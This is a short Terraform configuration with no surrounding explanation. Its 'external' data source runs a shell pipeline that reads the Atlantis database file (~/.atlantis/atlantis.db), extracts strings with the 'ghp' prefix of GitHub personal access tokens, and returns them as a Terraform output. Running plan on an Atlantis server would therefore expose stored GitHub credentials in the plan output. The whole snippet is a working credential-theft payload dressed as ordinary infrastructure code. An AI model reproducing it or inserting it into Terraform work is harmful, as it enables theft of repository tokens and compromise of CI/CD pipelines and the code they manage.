data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | awk '{print $0\",\"}' | sed '$ s/.$//' | xargs -0 printf '{ %s }'"]
}
output "test"  {
  value = data.external.example.result.CloneURL
}
